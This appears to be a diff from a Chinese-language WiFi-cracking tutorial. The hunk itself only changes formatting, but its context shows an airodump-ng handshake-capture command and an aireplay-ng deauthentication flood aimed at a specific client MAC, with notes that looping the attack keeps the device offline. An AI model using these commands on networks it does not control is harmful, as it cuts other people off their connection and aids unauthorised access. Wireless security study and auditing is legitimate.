@@ -33,7 +33,7 @@ airodump-ng -c 1 --bssid 48:0E:EC:7C:32:99 -w ~/a/ 网卡名
 ![Alt text](/assets/img/监听wifi握手包.png)
 
 
-* 为了加速获取握手包可以选取一个连接当前WiFi的设备进行攻击，使用aireplay给其发送断开包，设备断开后就会进行自动重连
+为了加速获取握手包可以选取一个连接当前WiFi的设备进行攻击，使用aireplay给其发送断开包，设备断开后就会进行自动重连
 ```
 aireplay-ng -0 0 -c AC:88:FD:14:31:5B -a 48:0E:EC:7C:32:99 网卡名
 -0  表示发起攻击（deauthentication洪水攻击），后面指定攻击次数，设置0则为循环攻击，不停的攻击客户端将无法正常上网（ctrl+c停止）
